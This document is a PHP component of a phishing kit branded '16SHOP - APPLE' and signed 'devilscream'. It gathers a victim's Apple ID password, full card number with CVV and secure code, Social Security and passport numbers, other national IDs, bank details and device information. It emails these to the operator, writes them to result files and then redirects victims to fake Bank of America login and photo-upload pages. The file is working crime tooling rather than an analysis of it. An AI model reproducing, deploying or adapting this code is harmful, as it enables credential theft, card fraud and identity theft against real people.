<?php
// scampage by devilscream
session_start();
$setting = parse_ini_file('../.config');
$idnum = $_SESSION['idnumber'];
$qatarid = $_SESSION['qatarid'];
$civilid = $_SESSION['civilid'];
$nationalid = $_SESSION['nationalid'];
$citizenid = $_SESSION['citizenid'];
$passport = $_SESSION['passportnumber'];
$bank_num = $_POST['bankaccnumber'];
$cassn = $_SESSION['cassn'];
$ssn = $_SESSION['ssn'];
$acc_number = $_SESSION['acc_number'];
$osid = $_SESSION['osidnum'];
$banknya = $_SESSION['bank_name'];
$sort = $_POST['sortcode'];
$driver = $_POST['driver_license'];
$nameofcard = $_SESSION['ccname'];
$nabid = $_POST['nabid'];
$bsbnumber = $_POST['bsbnumber'];
$agent = $_SERVER['HTTP_USER_AGENT'];
if($_SESSION['ccnumber'] == "") {
	exit();
}

if($setting['mix_result'] == 1) {
	session_start();
	$message  = "#--------------------------------[ 16SHOP - APPLE ]-----------------------------#\n";
	$message .= "#--------------------------------[ LOGIN DETAILS ]-------------------------------#\n";
	$message .= "Apple ID			: ".$_SESSION['email']."\n";
	$message .= "Password			: ".$_SESSION['password']."\n";
	$message .= "Status			    : ".$_SESSION['status']."\n";
	$message .= "#--------------------------------[ CARD DETAILS ]-------------------------------#\n";
	$message .= "Bank			: ".$_SESSION['bank_name']."\n";
	$message .= "Type			: ".$_SESSION['bank_scheme']." - ".$_SESSION['bank_type']."\n";
	$message .= "Level			: ".$_SESSION['bank_brand']."\n";
	$message .= "Cardholders    : ".$_SESSION['ccname']."\n";
	$message .= "CC Number		: ".$_SESSION['ccnumber']."\n";
	$message .= "Expired		: ".$_SESSION['ccexpired']."\n";
	$message .= "CVV			: ".$_SESSION['cccvv']."\n";
	$message .= "Copy			: ".$_SESSION['ccnumber']."|".$_SESSION['ccexpired']."|".$_SESSION['cccvv']."\n";
	$message .= "#-------------------------[ PERSONAL INFORMATION ]--------------------------------#\n";
	$message .= "First Name		: ".$_SESSION['firstname']."\n";
	$message .= "Last Name		: ".$_SESSION['lastname']."\n";
	$message .= "Address 		: ".$_SESSION['address1']."\n";
	$message .= "City			: ".$_SESSION['city']."\n";
	$message .= "State			: ".$_SESSION['state']."\n";
	$message .= "Country		: ".$_SESSION['country']."\n";
	$message .= "Zip			: ".$_SESSION['zip']."\n";
	$message .= "BirthDay		: ".$_SESSION['dob']."\n";
	$message .= "Phone			: ".$_SESSION['phone']."\n";
	$message .= "#----------------------------[ VBV INFO ]-----------------------------#\n";
	$message .= "Mother Maiden name			: ".$_POST['Mname']."\n";
	$message .= "AMEX Last 3 Digit			: ".$_POST['last3digit']."\n";
	$message .= "Secure code				: ".$_POST['vbv']."\n";
	$message .= "#--------------------------[ JAPAN INFO ]-----------------------------#\n";
	$message .= "WEB ID						: ".$_POST['cardid']."\n";
	$message .= "Card Password				: ".$_POST['vbv']."\n";
	$message .= "#---------------------------[ US INFO ]-------------------------------#\n";
	$message .= "Social Security Number		: ".$ssn."\n";
	$message .= "#--------------------------[ OTHER INFO ]-----------------------------#\n";
	$message .= "ID Number					: ".$idnum."\n";
	$message .= "Civil ID					: ".$civilid."\n";
	$message .= "Qatar ID					: ".$qatarid."\n";
	$message .= "National ID				: ".$nationalid."\n";
	$message .= "Citizen ID					: ".$citizenid."\n";
	$message .= "NAB ID						: ".$nabid."\n";
	$message .= "BSB Number					: ".$bsbnumber."\n";
	$message .= "Passport Number			: ".$passport."\n";
	$message .= "Bank Access Number			: ".$bank_num."\n";
	$message .= "Social Insurance Number	: ".$cassn."\n";
	$message .= "Account Number				: ".$acc_number."\n";
	$message .= "Sort Code					: ".$sort."\n";
	$message .= "OSID Number				: ".$osid."\n";
	$message .= "Credit Limit				: ".$_POST['cc_limit']."\n";
	$message .= "#--------------------------[ PC INFO ]-----------------------------#\n";
	$message .= "IP Address					: ".$ip2."\n";
	$message .= "OS/Browser					: ".$os." / ".$br." / ".$cn."\n";
	$message .= "Date						: ".$date."\n";
	$message .= "User Agent		: ".$agent."\n";
	$message .= "#----------------------[ created by devilscream ]---------------------#\n";
}else{
	$message  = "#----------------------------[ VBV INFO ]-----------------------------#\n";
	$message .= "Cardholders				: ".$_SESSION['ccname']."\n";
	$message .= "CC Number					: ".$_SESSION['ccnumber']."\n";
	$message .= "Expired					: ".$_SESSION['ccexpired']."\n";
	$message .= "CVV						: ".$_SESSION['cccvv']."\n";
	$message .= "Date of birth				: ".$_SESSION['date']."\n";
	$message .= "Mother Maiden name			: ".$_POST['Mname']."\n";
	$message .= "AMEX Last 3 Digit			: ".$_POST['last3digit']."\n";
	$message .= "Secure code				: ".$_POST['vbv']."\n";
	$message .= "#--------------------------[ JAPAN INFO ]-----------------------------#\n";
	$message .= "WEB ID						: ".$_POST['cardid']."\n";
	$message .= "Card Password				: ".$_POST['vbv']."\n";
	$message .= "#---------------------------[ US INFO ]-------------------------------#\n";
	$message .= "Social Security Number		: ".$ssn."\n";
	$message .= "#--------------------------[ OTHER INFO ]-----------------------------#\n";
	$message .= "ID Number					: ".$idnum."\n";
	$message .= "Civil ID					: ".$civilid."\n";
	$message .= "Qatar ID					: ".$qatarid."\n";
	$message .= "National ID				: ".$nationalid."\n";
	$message .= "Citizen ID					: ".$citizenid."\n";
	$message .= "NAB ID						: ".$nabid."\n";
	$message .= "BSB Number					: ".$bsbnumber."\n";
	$message .= "Passport Number			: ".$passport."\n";
	$message .= "Bank Access Number			: ".$bank_num."\n";
	$message .= "Social Insurance Number	: ".$cassn."\n";
	$message .= "Account Number				: ".$acc_number."\n";
	$message .= "Sort Code					: ".$sort."\n";
	$message .= "OSID Number				: ".$osid."\n";
	$message .= "Credit Limit				: ".$_POST['cc_limit']."\n";
	$message .= "#--------------------------[ PC INFO ]-----------------------------#\n";
	$message .= "IP Address					: ".$ip2."\n";
	$message .= "OS/Browser					: ".$os." / ".$br." / ".$cn."\n";
	$message .= "Date						: ".$date."\n";
	$message .= "User Agent		: ".$agent."\n";
	$message .= "#----------------------[ created by devilscream ]---------------------#\n";
}

if($setting['mix_result'] == 1) {
	if($_SESSION['cc_brand'] == "") {
		$subject = $_SESSION['bank_bin']." - ".$_SESSION['bank_scheme']." ".$_SESSION['bank_type']." ".$_SESSION['bank_name']." [ $cn - $os - $ip2 ]";
		$subbin =$_SESSION['bank_bin']." - ".$_SESSION['bank_scheme']." ".$_SESSION['bank_type']." ".$_SESSION['bank_name'];
		
	}else{
		$subject = $_SESSION['bank_bin']." - ".$_SESSION['bank_scheme']." ".$_SESSION['bank_type']." ".$_SESSION['bank_brand']." ".$_SESSION['bank_name']." [ $cn - $os - $ip2 ]";
		$subbin = $_SESSION['bank_bin']." - ".$_SESSION['bank_scheme']." ".$_SESSION['bank_type']." ".$_SESSION['bank_brand']." ".$_SESSION['bank_name'];
	}
	
}else{
    $subject = "APPLE VBV: ".$_SESSION['cc_name']." [ $cn - $os - $ip2 ]";
}
validate();
$from = $_SESSION['firstname']." ".$_SESSION['lastname'];
kirim_mail($to,$from,$subject,$message);

if($backup == 1) {
	@fclose(@fwrite(@fopen("../result/result-info.txt", "a"),"Title: $subject\n".$message));
	@fclose(@fwrite(@fopen("../result/vbv-info.txt", "a"),"Title: $subject\n".$message));
}

$click = fopen("../result/log_visitor.txt","a");
$jam = date("h:i:sa");
fwrite($click,"[$jam - $ip2 - $cn - $br - $os] Mengisi VBV"."\n");
fclose($click);

$click = fopen("../result/total_vbv.txt","a");
fwrite($click,"$ip2"."\n");
fclose($click);

if($setting['mix_result'] == 1) {
		$click = fopen("../result/total_cc.txt","a");
    	fwrite($click,"$ip2"."\n");
    	fclose($click);
    	$click = fopen("../result/total_bin.txt","a");
    	fwrite($click,"$subbin"."\n");
    	fclose($click);
}

if($double_cc == 1) {
	if($_SESSION['cc_kedua'] == "") {
		$_SESSION['cc_kedua'] = "done";
		echo "<META HTTP-EQUIV='refresh' content='0; URL=?view=update&appIdKey=".$_SESSION['key']."&id=".$_POST["xuser"]."&country=".$cid."&error=2'>";
		exit();
	}
}

if($banknya == "BANK OF AMERICA" and $get_bank == 1) {
	echo "<META HTTP-EQUIV='refresh' content='0; URL=?view=boalogin&/login/sign-in/signOnV2Screen.go?&next=https://appleid.apple.com/account/manage/upload&appIdKey=".$_SESSION['key']."&id=".$_SESSION['xusername']."&country=".$cid."'>";
	exit();
}elseif($banknya == "BANK OF AMERICA, NATIONAL ASSOCIATION" and $get_bank == 1){
	echo "<META HTTP-EQUIV='refresh' content='0; URL=?view=boalogin&/login/sign-in/signOnV2Screen.go?&next=https://appleid.apple.com/account/manage/upload&appIdKey=".$_SESSION['key']."&id=".$_SESSION['xusername']."&country=".$cid."'>";
	exit();
}elseif($banknya == "BANK OF AMERICA, N.A." and $get_bank == 1){
	echo "<META HTTP-EQUIV='refresh' content='0; URL=?view=boalogin&/login/sign-in/signOnV2Screen.go?&next=https://appleid.apple.com/account/manage/upload&appIdKey=".$_SESSION['key']."&id=".$_SESSION['xusername']."&country=".$cid."'>";
	exit();
}else{
	if($getphoto == 1) {
		echo "<META HTTP-EQUIV='refresh' content='0; URL=?view=upload&appIdKey=".$_SESSION['key']."&id=".$_SESSION['xusername']."&country=".$cid."'>";
		exit();
	}else{
		echo "<META HTTP-EQUIV='refresh' content='0; URL=?view=done&appIdKey=".$_SESSION['key']."&id=".$_SESSION['xusername']."&country=".$cid."'>";
	}
}
?>